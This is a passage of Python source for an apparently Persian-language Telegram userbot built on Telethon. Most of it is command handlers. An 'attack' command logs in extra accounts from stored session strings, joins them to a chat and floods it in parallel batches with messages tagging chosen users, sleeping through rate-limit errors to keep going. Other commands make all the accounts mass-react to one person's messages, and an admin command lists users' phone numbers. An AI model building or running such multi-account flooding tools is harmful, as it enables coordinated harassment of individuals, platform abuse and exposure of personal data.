                            await event.reply(str(deleted) + " پیام حذف شد")
                        except Exception:
                            pass
                    await asyncio.sleep(2)
                    try:
                        await event.delete()
                    except Exception:
                        pass
                try:
                    loop.create_task(_del_mine())
                except Exception:
                    asyncio.create_task(_del_mine())
                return

            # .اولین پیام — ریپلای روی کاربر
            if (_ts in ('.اولین پیام',) or _tn in ('.اولین پیام',)) and event.is_reply:
                try:
                    await event.edit("در حال پیدا کردن...")
                except Exception:
                    pass
                try:
                    rep = await event.get_reply_message()
                    tid = await get_real_sender(rep)
                    if not tid:
                        await event.delete()
                        return
                    name = await resolve_name(event.client, tid)
                    chat = await event.get_chat()
                    gname = getattr(chat, 'title', None) or str(event.chat_id)
                    first = None
                    tid_i = int(tid)
                    # موجودیت کاربر برای فیلتر دقیق
                    user_ent = None
                    try:
                        user_ent = await event.client.get_input_entity(tid_i)
                    except Exception:
                        try:
                            user_ent = await event.client.get_entity(tid_i)
                        except Exception:
                            user_ent = tid_i
                    # از قدیم‌ترین پیام چت به جلو تا اولین پیام این کاربر
                    try:
                        async for msg in event.client.iter_messages(event.chat_id, reverse=True):
                            sid = getattr(msg, 'sender_id', None)
                            if sid is None and getattr(msg, 'from_id', None) is not None:
                                sid = getattr(msg.from_id, 'user_id', None)
                            try:
                                if sid is not None and int(sid) == tid_i:
                                    first = msg
                                    break
                            except Exception:
                                pass
                    except Exception:
                        first = None
                    # اگر طول کشید یا نشد: فیلتر from_user از اول
                    if not first:
                        try:
                            async for msg in event.client.iter_messages(event.chat_id, from_user=user_ent, reverse=True):
                                first = msg
                                break
                        except Exception:
                            pass
                    if not first:
                        try:
                            oldest = None
                            async for msg in event.client.iter_messages(event.chat_id, from_user=user_ent, limit=5000):
                                oldest = msg
                            first = oldest
                        except Exception:
                            pass
                    if first:
                        # فقط ریپلای روی اولین پیام — بدون لینک
                        body = (
                            "<blockquote>اولین پیام " + str(name).replace('<', '') + "</blockquote>"
                            + chr(10)
                            + "<blockquote>STRSelf</blockquote>"
                        )
                        try:
                            await event.client.send_message(
                                event.chat_id,
                                body,
                                reply_to=first.id,
                                parse_mode='HTML',
                            )
                        except Exception:
                            await event.client.send_message(event.chat_id, body, parse_mode='HTML')
                        try:
                            await event.delete()
                        except Exception:
                            pass
                    try:
                        await event.delete()
                    except Exception:
                        pass
                except Exception as e:
                    try:
                        await event.edit("خطا: " + str(e)[:80])
                    except Exception:
                        pass
                return





            # .اتک متن تعداد [ایدی کاراکتر]
            _atk_m = _re_pri.match(r'^[.．٫/]\s*اتک\s+(.+)$', _ts)
            if not _atk_m:
                _atk_m = _re_pri.match(r'^[.．٫/]\s*اتک\s+(.+)$', _tn)
            if _atk_m:
                raw = (_atk_m.group(1) or '').strip()
                extras = get_extras(uid) or {}
                acc_ids = [a for a in extras.keys() if str(a).lower() not in ('all', 'none', '')]
                if not acc_ids:
                    try:
                        await event.edit("اکانتی اضافه نکردی")
                    except Exception:
                        try:
                            await event.reply("اکانتی اضافه نکردی")
                        except Exception:
                            pass
                    await asyncio.sleep(2)
                    try:
                        await event.delete()
                    except Exception:
                        pass
                    return
                tokens = [to_en_digits(t) for t in raw.split()]
                count_idx = None
                for i in range(len(tokens) - 1, -1, -1):
                    if tokens[i].isdigit() and 1 <= len(tokens[i]) <= 8:
                        count_idx = i
                        break
                if count_idx is None:
                    try:
                        await event.edit("مثال:\n.اتک درود 10")
                    except Exception:
                        try:
                            await event.reply("مثال:" + chr(10) + ".اتک درود 10")
                        except Exception:
                            pass
                    return
                count = int(tokens[count_idx])
                if count < 1:
                    try:
                        await event.edit("تعداد نامعتبر")
                    except Exception:
                        pass
                    return
                spam_text = " ".join(tokens[:count_idx]).strip() or " "
                after = tokens[count_idx + 1:]
                ids = [int(t) for t in after if t.isdigit() and len(t) >= 5]
                chars = [t for t in after if not t.isdigit()]
                body0 = spam_text
                if ids:
                    use_chars = chars if chars else ["."]
                    parts = []
                    for i, tid in enumerate(ids):
                        ch = use_chars[i] if i < len(use_chars) else use_chars[-1]
                        parts.append("[" + ch + "](tg://user?id=" + str(tid) + ")")
                    body0 = (spam_text + " " if spam_text else "") + " ".join(parts)
                reply_to = None
                try:
                    if event.is_reply:
                        rep = await event.get_reply_message()
                        if rep:
                            reply_to = rep.id
                except Exception:
                    pass
                # پاک‌سازی حالت قبلی تا دفعه بعد گیر نکند
                try:
                    oldj = extra_attack_jobs.get(uid)
                    if oldj:
                        oldj['active'] = False
                except Exception:
                    pass
                extra_attack_jobs.pop(uid, None)
                spam_cancel[uid] = False
                extra_attack_jobs[uid] = {
                    'active': True, 'count': count, 'sent': 0,
                    'text': body0, 'chat_id': event.chat_id,
                    'parse': 'Markdown' if ids else None, 'reply_to': reply_to,
                }
                try:
                    await event.delete()
                except Exception:
                    pass

                async def _run_attack_pri():
                    job = extra_attack_jobs.get(uid)
                    if not job:
                        return
                    chat_id = job['chat_id']
                    body = job['text']
                    rto = job.get('reply_to')
                    need = int(job['count'])
                    try:
                        dly = float(get_ud(uid, 'extra_spam_delay', 0) or 0)
                    except Exception:
                        dly = 0
                    if dly < 0:
                        dly = 0
                    # اتصال همه اکانت‌ها + جوین خاموش اگر لازم
                    inv_info = {}
                    try:
                        inv_info = (get_ud(uid, 'extra_group_invites', {}) or {}).get(str(chat_id)) or {}
                    except Exception:
                        inv_info = {}
                    from telethon.tl.functions.messages import ImportChatInviteRequest as _ImpInv
                    from telethon.tl.functions.channels import JoinChannelRequest as _JoinCh

                    async def _prep(aid):
                        try:
                            inf = extras.get(str(aid)) or extras.get(aid) or {}
                            sess = inf.get('session')
                            if not sess:
                                return False
                            await start_extra_client(uid, aid, sess)
                            cl = extra_clients.get((int(uid), int(aid)))
                            if not cl:
                                return False
                            # اگر عضو نیست با لینک ذخیره‌شده جوین شو
                            try:
                                await cl.get_permissions(chat_id, 'me')
                                return True
                            except Exception:
                                pass
                            link = inv_info.get('link') if isinstance(inv_info, dict) else None
                            un = inv_info.get('username') if isinstance(inv_info, dict) else None
                            if link:
                                hp = str(link)
                                for pref in ('https://t.me/+', 'http://t.me/+', 'https://t.me/joinchat/', 'http://t.me/joinchat/', 't.me/+', 't.me/joinchat/'):
                                    hp = hp.replace(pref, '')
                                hp = hp.strip().split('/')[-1].split('?')[0]
                                if hp:
                                    try:
                                        await cl(_ImpInv(hp))
                                    except Exception:
                                        pass
                            if un:
                                try:
                                    await cl(_JoinCh(un))
                                except Exception:
                                    pass
                            return True
                        except Exception:
                            return False

                    try:
                        await asyncio.gather(*[_prep(a) for a in acc_ids], return_exceptions=True)
                    except Exception:
                        pass

                    async def _one(aid):
                        sent_local = 0
                        try:
                            key = (int(uid), int(aid))
                            cl = extra_clients.get(key)
                            if not cl:
                                inf = extras.get(str(aid)) or extras.get(aid) or {}
                                sess = inf.get('session')
                                if sess:
                                    await start_extra_client(uid, aid, sess)
                                    cl = extra_clients.get(key)
                            if not cl:
                                return 0
                            # دسته‌های موازی — ۱۰ تا زیر ۱ ثانیه
                            batch = 10 if dly <= 0.05 else max(1, int(1.0 / max(dly, 0.05)))
                            batch = max(1, min(batch, 15))
                            while sent_local < need:
                                job2 = extra_attack_jobs.get(uid)
                                if not job2 or not job2.get('active') or spam_cancel.get(uid):
                                    break
                                n = min(batch, need - sent_local)
                                # مطمئن شو وصل است
                                try:
                                    if not cl.is_connected():
                                        await cl.connect()
                                except Exception:
                                    try:
                                        inf = extras.get(str(aid)) or extras.get(aid) or {}
                                        sess = inf.get('session')
                                        if sess:
                                            await start_extra_client(uid, aid, sess)
                                            cl = extra_clients.get((int(uid), int(aid)))
                                    except Exception:
                                        pass
                                if not cl:
                                    break
                                async def _send_once(c=cl):
                                    kw = {}
                                    if rto:
                                        kw['reply_to'] = rto
                                    if job.get('parse'):
                                        kw['parse_mode'] = 'Markdown'
                                    await c.send_message(chat_id, body, **kw)
                                tasks = [_send_once() for _ in range(n)]
                                results = await asyncio.gather(*tasks, return_exceptions=True)
                                for r in results:
                                    if not isinstance(r, Exception):
                                        sent_local += 1
                                        try:
                                            job2['sent'] = int(job2.get('sent') or 0) + 1
                                        except Exception:
                                            pass
                                    elif isinstance(r, FloodWaitError):
                                        await asyncio.sleep(min(20, int(getattr(r, 'seconds', 2)) + 1))
                                    else:
                                        # یک‌بار وصل مجدد
                                        try:
                                            if not cl.is_connected():
                                                await cl.connect()
                                        except Exception:
                                            pass
                                if dly > 0.05:
                                    await asyncio.sleep(dly)
                                elif sent_local < need:
                                    await asyncio.sleep(0.02)
                        except Exception:
                            pass
                        return sent_local
                    try:
                        await asyncio.gather(*[_one(a) for a in acc_ids], return_exceptions=True)
                    except Exception:
                        for a in acc_ids:
                            try:
                                await _one(a)
                            except Exception:
                                pass
                    try:
                        extra_attack_jobs.pop(uid, None)
                    except Exception:
                        pass
                    spam_cancel[uid] = False
                try:
                    loop.create_task(_run_attack_pri())
                except Exception:
                    try:
                        asyncio.get_event_loop().create_task(_run_attack_pri())
                    except Exception:
                        asyncio.create_task(_run_attack_pri())
                return

            # .ری اکت خاموش
            if _ts.startswith('.ری اکت خاموش') or _tn.startswith('.ری اکت خاموش'):
                try:
                    for k in list(auto_react_jobs.keys()):
                        if isinstance(k, tuple) and len(k) >= 1 and int(k[0]) == int(uid):
                            auto_react_jobs.pop(k, None)
                except Exception:
                    pass
                try:
                    react_targets.pop(uid, None)
                except Exception:
                    pass
                try:
                    await event.edit("ری اکت ها خاموش شدن")
                except Exception:
                    try:
                        await event.reply("ری اکت ها خاموش شدن")
                    except Exception:
                        pass
                await asyncio.sleep(1.5)
                try:
                    await event.delete()
                except Exception:
                    pass
                return

            # .ری اکت خودکار ایموجی — روی هر پیام طرف
            if _ts.startswith('.ری اکت خودکار') or _tn.startswith('.ری اکت خودکار'):
                if not event.is_reply:
                    try:
                        await event.edit("روی پیام کاربر ریپلای کن")
                    except Exception:
                        pass
                    return
                emo = _ts.replace('.ری اکت خودکار', '', 1).strip() or _tn.replace('.ری اکت خودکار', '', 1).strip()
                if not emo:
                    try:
                        await event.edit("ایموجی بده\nمثال: .ری اکت خودکار 🤣")
                    except Exception:
                        pass
                    return
                extras = get_extras(uid) or {}
                acc_ids = [a for a in extras.keys() if str(a).lower() not in ('all', 'none', '')]
                if not acc_ids:
                    try:
                        await event.edit("اکانتی اضافه نکردی")
                    except Exception:
                        pass
                    await asyncio.sleep(2)
                    try:
                        await event.delete()
                    except Exception:
                        pass
                    return
                rep = await event.get_reply_message()
                tid = await get_real_sender(rep)
                if not tid:
                    try:
                        await event.edit("کاربر پیدا نشد")
                    except Exception:
                        pass
                    return
                auto_react_jobs[(int(uid), int(tid))] = {
                    'count': len(acc_ids), 'emoji': emo, 'random': False,
                    'chat_id': int(event.chat_id),
                }
                name = await resolve_name(event.client, tid)
                try:
                    await event.edit("ری اکت خودکار " + emo + " روی " + mention(tid, name), parse_mode='Markdown')
                except Exception:
                    try:
                        await event.edit("ری اکت خودکار " + emo)
                    except Exception:
                        pass
                await asyncio.sleep(1.5)
                try:
                    await event.delete()
                except Exception:
                    pass
                return

            # .ری اکت 🤣 — یک‌بار همه اکانت‌ها روی پیام
            if (_ts.startswith('.ری اکت ') or _tn.startswith('.ری اکت ')) and not _ts.startswith('.ری اکت اتک') and not _ts.startswith('.ری اکت رندوم') and not _ts.startswith('.ری اکت خاموش') and not _ts.startswith('.ری اکت خودکار') and not _tn.startswith('.ری اکت خودکار') and not _tn.startswith('.ری اکت اتک') and not _tn.startswith('.ری اکت رندوم') and not _tn.startswith('.ری اکت خاموش'):
                rest = _ts[len('.ری اکت '):].strip() if _ts.startswith('.ری اکت ') else _tn[len('.ری اکت '):].strip()
                emo = (rest.split()[0] if rest.split() else '') or '👍'
                if not event.is_reply:
                    try:
                        await event.delete()
                    except Exception:
                        pass
                    return
                try:
                    rep = await event.get_reply_message()
                except Exception:
                    rep = None
                if not rep:
                    try:
                        await event.delete()
                    except Exception:
                        pass
                    return
                tid = None
                try:
                    tid = await get_real_sender(rep)
                except Exception:
                    tid = getattr(rep, 'sender_id', None)
                name = 'کاربر'
                try:
                    if tid:
                        name = await resolve_name(event.client, tid)
                except Exception:
                    pass
                extras = get_extras(uid) or {}
                acc_ids = [a for a in extras.keys() if str(a).lower() not in ('all', 'none', '')]
                ok = 0
                chat_id = event.chat_id
                mid = rep.id
                for aid in acc_ids:
                    try:
                        key = (int(uid), int(aid))
                        cl = extra_clients.get(key)
                        if not cl:
                            inf = extras.get(str(aid)) or extras.get(aid) or {}
                            sess = inf.get('session')
                            if sess:
                                await start_extra_client(uid, aid, sess)
                                cl = extra_clients.get(key)
                        if not cl:
                            continue
                        done = False
                        try:
                            msgs = await cl.get_messages(chat_id, ids=mid)
                            if msgs:
                                await msgs.react(emo)
                                done = True
                        except Exception:
                            pass
                        if not done:
                            try:
                                from telethon.tl.functions.messages import SendReactionRequest
                                from telethon.tl.types import ReactionEmoji
                                await cl(SendReactionRequest(
                                    peer=chat_id,
                                    msg_id=mid,
                                    reaction=[ReactionEmoji(emoticon=emo)]
                                ))
                                done = True
                            except Exception:
                                pass
                        if done:
                            ok += 1
                    except Exception:
                        pass
                try:
                    await event.edit(
                        str(ok) + " اکانت ری اکت " + emo + " به " + mention(tid, name),
                        parse_mode='Markdown'
                    )
                except Exception:
                    try:
                        await event.edit(str(ok) + " اکانت ری اکت " + emo + " به " + str(name))
                    except Exception:
                        pass
                await asyncio.sleep(2)
                try:
                    await event.delete()
                except Exception:
                    pass
                return

            # .ری اکت اتک ایموجی
            if _ts.startswith('.ری اکت اتک') or _tn.startswith('.ری اکت اتک'):
                if not event.is_reply:
                    try:
                        await event.edit("روی پیام کاربر ریپلای کن")
                    except Exception:
                        pass
                    return
                emo = _ts.replace('.ری اکت اتک', '', 1).strip() or _tn.replace('.ری اکت اتک', '', 1).strip()
                if not emo:
                    try:
                        await event.edit("ایموجی بده\nمثال: .ری اکت اتک 🤣")
                    except Exception:
                        pass
                    return
                extras = get_extras(uid) or {}
                acc_ids = [a for a in extras.keys() if str(a).lower() not in ('all', 'none', '')]
                if not acc_ids:
                    try:
                        await event.edit("اکانتی اضافه نکردی")
                    except Exception:
                        pass
                    await asyncio.sleep(2)
                    try:
                        await event.delete()
                    except Exception:
                        pass
                    return
                rep = await event.get_reply_message()
                tid = await get_real_sender(rep)
                if not tid:
                    try:
                        await event.edit("کاربر پیدا نشد")
                    except Exception:
                        pass
                    return
                auto_react_jobs[(int(uid), int(tid))] = {
                    'count': len(acc_ids), 'emoji': emo, 'random': False,
                    'chat_id': int(event.chat_id),
                }
                name = await resolve_name(event.client, tid)
                try:
                    await event.edit("اتک ری اکت " + emo + " به " + mention(tid, name), parse_mode='Markdown')
                except Exception:
                    try:
                        await event.edit("اتک ری اکت " + emo + " به " + str(name))
                    except Exception:
                        pass
                await asyncio.sleep(1.5)
                try:
                    await event.delete()
                except Exception:
                    pass
                return

            # .ری اکت رندوم
            if _ts.startswith('.ری اکت رندوم') or _tn.startswith('.ری اکت رندوم'):
                if not event.is_reply:
                    try:
                        await event.edit("روی پیام ریپلای کن")
                    except Exception:
                        pass
                    return
                extras = get_extras(uid) or {}
                acc_ids = [a for a in extras.keys() if str(a).lower() not in ('all', 'none', '')]
                if not acc_ids:
                    try:
                        await event.edit("اکانتی اضافه نکردی")
                    except Exception:
                        pass
                    await asyncio.sleep(2)
                    try:
                        await event.delete()
                    except Exception:
                        pass
                    return
                rep = await event.get_reply_message()
                tid = await get_real_sender(rep)
                mid = rep.id
                chat_id = event.chat_id
                pool = ['👍', '❤', '❤️', '🔥', '😂', '👏', '😍', '🎉', '💯', '⚡', '🤝', '🤣', '😁', '😊']
                for aid in acc_ids:
                    try:
                        key = (int(uid), int(aid))
                        cl = extra_clients.get(key)
                        if not cl:
                            inf = extras.get(str(aid)) or extras.get(aid) or {}
                            sess = inf.get('session')
                            if sess:
                                await start_extra_client(uid, aid, sess)
                                cl = extra_clients.get(key)
                        if not cl:
                            continue
                        emo = random.choice(pool)
                        try:
                            msgs = await cl.get_messages(chat_id, ids=mid)
                            if msgs:
                                await msgs.react(emo)
                                continue
                        except Exception:
                            pass
                        try:
                            peer = await cl.get_input_entity(chat_id)
                            await cl(SendReactionRequest(peer=peer, msg_id=mid, reaction=[ReactionEmoji(emoticon=emo)]))
                        except Exception:
                            try:
                                await cl(SendReactionRequest(peer=chat_id, msg_id=mid, reaction=[ReactionEmoji(emoticon=emo)]))
                            except Exception:
                                pass
                    except Exception:
                        continue
                name = await resolve_name(event.client, tid) if tid else "?"
                try:
                    await event.edit("ری اکت رندوم به " + mention(tid, name), parse_mode='Markdown')
                except Exception:
                    try:
                        await event.edit("ری اکت رندوم به " + str(name))
                    except Exception:
                        pass
                await asyncio.sleep(1.5)
                try:
                    await event.delete()
                except Exception:
                    pass
                return


        # Silence feature: if private message from silenced user
        if event.is_private and sender.id != uid:
            silenced = get_ud(uid, 'silenced', [])
            if sender.id in silenced:
                try:
                    name = getattr(sender, 'first_name', None) or str(sender.id)
                    header = f"🔇 پیام از کاربر سکوت‌شده:\n{mention(sender.id, name)}\nآیدی: `{sender.id}`\n──────────────"
                    await event.client.send_message('me', header, parse_mode='Markdown')
                    await event.forward_to('me')
                    await event.delete()
                    try:
                        await event.client(DeleteHistoryRequest(peer=sender.id, max_id=0, just_clear=False, revoke=True))
                    except:
                        pass
                except:
                    pass
                return

        if get_ud(uid, 'self_enabled', True) and get_ud(uid, 'coins', 0) > 0:
            reacts = react_targets.get(uid) or {}
            # کلید ممکن است int یا str باشد
            rdata = reacts.get(sender.id)
            if rdata is None:
                rdata = reacts.get(str(sender.id))
            if rdata is not None and not event.out:
                if isinstance(rdata, dict):
                    emoji = (rdata.get('emoji') or '').strip()
                    scope = rdata.get('scope', 'group')
                else:
                    emoji = str(rdata).strip()
                    scope = 'group'
                ok = True
                if scope == 'group' and not event.is_group:
                    ok = False
                if scope == 'private' and not event.is_private:
                    ok = False
                if ok and emoji:
                    # فقط خود ایموجی (بدون فاصله اضافه)
                    emo = emoji.split()[0] if emoji.split() else emoji
                    delay = get_ud(uid, 'react_delay', 0)
                    if delay and float(delay) > 0:
                        await asyncio.sleep(float(delay))
                    try:
                        await event.client(SendReactionRequest(
                            peer=event.chat_id,
                            msg_id=event.id,
                            reaction=[ReactionEmoji(emoticon=emo)],
                        ))
                    except Exception:
                        try:
                            await event.client(SendReactionRequest(
                                peer=await event.get_input_chat(),
                                msg_id=event.id,
                                reaction=[ReactionEmoji(emoticon=emo)],
                            ))
                        except Exception:
                            pass



        # ذخیره پاسخ خودکار (متن یا مدیا)
        if sender.id == uid and uid in reply_wait:
            st = reply_wait[uid]
            if st.get('step') == 'key':
                if not text:
                    return
                st['key'] = text.lower().strip()
                st['step'] = 'value'
                try:
                    await event.edit("پاسخ خودکار رو بفرست" + chr(10) + "متن / گیف / استیکر / ویس / عکس / هر فرمتی")
                except Exception:
                    try:
                        await event.respond("پاسخ خودکار رو بفرست (متن یا مدیا)")
                    except Exception:
                        pass
                return
            if st.get('step') == 'value':
                key = st.get('key') or ''
                media_path = None
                kind = 'text'
                try:
                    if event.message.media:
                        os.makedirs('reply_media', exist_ok=True)
                        media_path = await event.client.download_media(
                            event.message, file=os.path.join('reply_media', f'{uid}_{int(event.id)}')
                        )
                        if event.message.sticker:
                            kind = 'sticker'
                        elif event.message.gif or (event.message.document and 'gif' in str(getattr(event.message.document, 'mime_type', '') or '')):
                            kind = 'gif'
                        elif event.message.voice:
                            kind = 'voice'
                        elif event.message.video_note:
                            kind = 'video_note'
                        elif event.message.video:
                            kind = 'video'
                        elif event.message.photo:
                            kind = 'photo'
                        elif event.message.audio:
                            kind = 'audio'
                        else:
                            kind = 'document'
                except Exception:
                    media_path = None
                cap = event.message.message or event.message.text or text or ''
                data = {
                    'text': cap,
                    'media': media_path,
                    'kind': kind,
                    'entities': entities_to_dict(event.message.entities),
                    'entities_data': entities_to_data(event.message.entities),
                }
                replies = get_ud(uid, 'auto_replies', {})
                replies[key] = data
                set_user(uid, 'auto_replies', replies)
                del reply_wait[uid]
                try:
                    await event.edit(f"پاسخ برای «{key}» ذخیره شد ({kind})")
                except Exception:
                    try:
                        await event.respond(f"پاسخ برای «{key}» ذخیره شد ({kind})")
                    except Exception:
                        pass
                await asyncio.sleep(2)
                try:
                    await event.delete()
                except Exception:
                    pass
                return


        # ذخیره محتوا — حتی اگر فقط مدیا باشد (بدون متن)
        if sender.id == uid and uid in content_wait:
            st = content_wait[uid]
            if st.get('step') == 'value':
                key = st.get('key') or ''
                msg = event.message
                raw = msg.text or msg.message or getattr(msg, 'raw_text', None) or ''
                caption = (msg.message or '') if msg.media else raw
                media_path = None
                kind = 'text'
                try:
                    if msg.media:
                        os.makedirs('content_media', exist_ok=True)
                        media_path = await event.client.download_media(
                            msg, file=os.path.join('content_media', f'{uid}_{key}_{int(msg.id)}')
                        )
                        if msg.photo: kind = 'photo'
                        elif msg.video: kind = 'video'
                        elif msg.voice: kind = 'voice'
                        elif msg.video_note: kind = 'video_note'
                        elif msg.sticker: kind = 'sticker'
                        elif getattr(msg, 'gif', None) or (msg.document and 'gif' in str(getattr(msg.document, 'mime_type', '') or '')):
                            kind = 'gif'
                        elif msg.document: kind = 'document'
                        else: kind = 'media'
                except Exception:
                    media_path = None
                content_data = {
                    'text': caption if msg.media else raw,
                    'entities': entities_to_dict(msg.entities),
                    'entities_data': entities_to_data(msg.entities),
                    'media': media_path,
                    'kind': kind,
                }
                contents = get_ud(uid, 'contents', {})
                contents[key] = content_data
                set_user(uid, 'contents', contents)
                del content_wait[uid]
                try:
                    await event.edit(f"محتوا برای «{key}» ذخیره شد ({kind})")
                except Exception:
                    try:
                        await event.respond(f"محتوا برای «{key}» ذخیره شد ({kind})")
                    except Exception:
                        pass
                return


        # ذخیره محتوا — حتی اگر فقط مدیا باشد (بدون متن)
        if sender.id == uid and uid in content_wait:
            st = content_wait[uid]
            if st.get('step') == 'value':
                key = st.get('key') or ''
                msg = event.message
                raw = (msg.text or msg.message or getattr(msg, 'raw_text', None) or '') or ''
                caption = (msg.message or '') if msg.media else raw
                media_path = None
                kind = 'text'
                try:
                    if msg.media:
                        os.makedirs('content_media', exist_ok=True)
                        media_path = await event.client.download_media(
                            msg, file=os.path.join('content_media', f'{uid}_{key}_{int(msg.id)}')
                        )
                        kind = media_kind(msg)
                except Exception:
                    media_path = None
                content_data = {
                    'text': caption,
                    'entities': entities_to_dict(msg.entities),
                    'entities_data': entities_to_data(msg.entities),
                    'media': media_path,
                    'kind': kind,
                }
                contents = get_ud(uid, 'contents', {}) or {}
                contents[key] = content_data
                set_user(uid, 'contents', contents)
                del content_wait[uid]
                try:
                    await event.reply(f"محتوا برای «{key}» ذخیره شد ({kind})")
                except Exception:
                    try:
                        await event.edit(f"محتوا برای «{key}» ذخیره شد ({kind})")
                    except Exception:
                        pass
                return

        # دستورات خروجی سلف — event.out مطمئن‌تر از مقایسه sender است
        if text and (event.out or (sender and int(getattr(sender, 'id', 0) or 0) == int(uid))):
            # استایل متن: فقط یک‌بار — حذف و ارسال با فرمت (بدون لوپ)
            if (
                event.out
                and text
                and not is_cmd_text(text)
                and not is_cmd_text(text_norm)
                and not text.startswith('http://')
                and not text.startswith('https://')
                and not text.startswith('t.me/')
                and not text.startswith('@')
                and get_ud(uid, 'text_style')
            ):
                sk = (event.chat_id, event.id)
                if sk in style_skip:
                    style_skip.discard(sk)
                else:
                    # اگر از قبل entity فرمت دارد، دست نزن
                    already = False
                    try:
                        for e in (event.message.entities or []):
                            if isinstance(e, (MessageEntityBold, MessageEntityItalic)):
                                already = True
                                break
                    except Exception:
                        pass
                    if not already:
                        style = get_ud(uid, 'text_style')
                        try:
                            import re as _re
                            parts = []
                            last = 0
                            for m in _re.finditer(r'https?://\S+|t\.me/\S+|tg://\S+|@\w+|\d{6,}', text):
                                if m.start() > last:
                                    parts.append(('text', text[last:m.start()]))
                                parts.append(('link', m.group(0)))
                                last = m.end()
                            if last < len(text):
                                parts.append(('text', text[last:]))
                            if not parts:
                                parts = [('text', text)]
                            out = ''
                            ents = []
                            for kind, seg in parts:
                                if not seg:
                                    continue
                                start_u = len(out.encode('utf-16-le')) // 2
                                out += seg
                                ln = len(seg.encode('utf-16-le')) // 2
                                if kind == 'text' and seg.strip():
                                    if style == 'bold':
                                        ents.append(MessageEntityBold(start_u, ln))
                                    elif style == 'italic':
                                        ents.append(MessageEntityItalic(start_u, ln))
                                    elif style == 'bold_italic':
                                        ents.append(MessageEntityBold(start_u, ln))
                                        ents.append(MessageEntityItalic(start_u, ln))

                            # همان پیام ویرایش شود (پیام جدید فرستاده نشود)
                            try:
                                await event.client.edit_message(
                                    event.chat_id,
                                    event.id,
                                    out,
                                    formatting_entities=ents or None,
                                )
                            except Exception:
                                try:
                                    await event.edit(out, formatting_entities=ents or None)
                                except Exception:
                                    pass
                        except Exception:
                            pass

            import re as _re_help
            _ht = text.strip()
            _hn = text_norm.strip()
            if _re_help.match(r'^[.．٫/]\s*راهنما(?:\s+(\d+))?\s*$', _ht) or _re_help.match(r'^[.．٫/]\s*راهنما(?:\s+(\d+))?\s*$', _hn) or _ht in ('.راهنما',) or _hn in ('.راهنما',):
                page = 0
                mm = _re_help.match(r'^[.．٫/]\s*راهنما(?:\s+(\d+))?\s*$', _ht) or _re_help.match(r'^[.．٫/]\s*راهنما(?:\s+(\d+))?\s*$', _hn)
                if mm and mm.group(1):
                    try:
                        page = max(0, int(to_en_digits(mm.group(1))) - 1)
                    except Exception:
                        page = 0
                helps = get_help_commands(uid)
                # ]
                try:
                    _ex = get_extras(uid) or {}
                    if any(str(a).lower() not in ('all','none','') for a in _ex.keys()):
                        helps.extend([
                            (".اتک متن تعداد", "اتک با اکانت‌های اضافه"),
                            (".set", "جوین اکانت‌ها به گروه"),
                            (".leave", "لفت اکانت‌ها"),
                            (".ری اکت 🤣", "ری‌اکت اکانت‌ها روی پیام"),
                            (".ری اکت خودکار", "ری‌اکت خودکار روی پیام طرف"),
                            (".جوین", "جوین با ریپلای لینک"),
                        ])
                except Exception:
                    pass
                per = 8
                total_pages = max(1, (len(helps) + per - 1) // per)
                if page >= total_pages:
                    page = total_pages - 1
                chunk = helps[page * per:(page + 1) * per]
                parts = ["<b>راهنمای دستورات سلف</b>", "<blockquote>صفحه " + str(page + 1) + "/" + str(total_pages) + "</blockquote>"]
                for cmd, desc in chunk:
                    parts.append(
                        "<blockquote><code>"
                        + str(cmd).replace("<", "&lt;")
                        + "</code>" + chr(10)
                        + str(desc).replace("<", "&lt;")
                        + "</blockquote>"
                    )
                body = chr(10).join(parts)
                try:
                    await event.delete()
                except Exception:
                    pass
                mk = types.InlineKeyboardMarkup(row_width=2)
                row = []
                if page > 0:
                    row.append(types.InlineKeyboardButton("◀ قبلی", callback_data="help_p_" + str(uid) + "_" + str(page - 1)))
                if page < total_pages - 1:
                    row.append(types.InlineKeyboardButton("بعدی ▶", callback_data="help_p_" + str(uid) + "_" + str(page + 1)))
                if row:
                    mk.row(*row)
                mk.add(types.InlineKeyboardButton("بستن", callback_data="help_close_" + str(uid)))
                try:
                    prev = help_panel_msgs.get(uid)
                    if prev:
                        try:
                            bot.delete_message(prev[0], prev[1])
                        except Exception:
                            pass
                except Exception:
                    pass
                sent = False
                try:
                    msg = bot.send_message(uid, body[:4000], parse_mode="HTML", reply_markup=mk)
                    help_panel_msgs[uid] = (uid, msg.message_id)
                    sent = True
                except Exception:
                    pass
                if not sent:
                    try:
                        msg = await event.client.send_message(event.chat_id, body[:4000], parse_mode="HTML")
                        help_panel_msgs[uid] = (event.chat_id, msg.id)
                    except Exception:
                        pass
                return



            # .لیست کاربران — فقط مالک/ادمین
            if text.strip() in ('.لیست کاربران', 'لیست کاربران') or text_norm.strip() in ('.لیست کاربران', 'لیست کاربران'):
                if not (is_owner(uid) or is_admin(uid)):
                    return
                users = load_data().get('users') or {}
                parts = ["<blockquote><b>لیست کاربران SelfStr</b></blockquote>"]
                for s, info in list(users.items())[:80]:
                    if not info.get('session') and not info.get('phone'):
                        continue
                    name = str(info.get('original_name') or s).replace('<','')
                    un = info.get('username')
                    phone = info.get('phone') or '—'
                    try:
                        mem = membership_duration_text(int(s))
                    except Exception:
                        mem = "—"
                    line = name + chr(10) + "ایدی: <code>" + str(s) + "</code>" + chr(10)
                    if un:
                        line += "یوزرنیم: @" + str(un).replace('<','') + chr(10)
                    line += "شماره: <code>" + str(phone) + "</code>" + chr(10) + "عضویت: " + str(mem)
                    parts.append("<blockquote>" + line + "</blockquote>")
                body = chr(10).join(parts)
                try:
                    await event.delete()
                except Exception:
                    pass
                try:
                    mk = None
                    # دکمه بستن فقط از طریق ربات سخت است؛ پیام سلف
                    msg = await event.client.send_message(event.chat_id, body[:4000], parse_mode='HTML')
                except Exception:
                    pass
                return

            if (text.replace('٫', '.').replace('．', '.').strip() in ('.پنل',) or text_norm.replace('٫', '.').replace(' ', '') == '.پنل'):
                try:
                    mark_self_use(uid)
                except Exception:
                    pass
                # حذف پنل قبلی همین چت
                try:
                    olds = list(self_panel_msgs.get((uid, event.chat_id)) or [])
                    for oid in olds:
                        try:
                            await event.client.delete_messages(event.chat_id, oid)
                        except Exception:
                            pass
                    self_panel_msgs[(uid, event.chat_id)] = []
                except Exception:
                    pass
                if not is_self_on(uid):
                    try:
                        await event.reply("سلف خاموش است — از ربات روشن کنید")
                    except Exception:
                        pass
                    return
                try:
                    await maybe_report_cmd(event, uid, "پنل", "")
                except Exception:
                    pass
                try:
                    await event.delete()
                except Exception:
                    pass
                sent = False
                try:
                    un = BOT_USERNAME
                    if not un:
                        try:
                            un = bot.get_me().username
                        except Exception:
                            un = None
                    if un:
                        from telethon.tl.functions.messages import GetInlineBotResultsRequest, SendInlineBotResultRequest
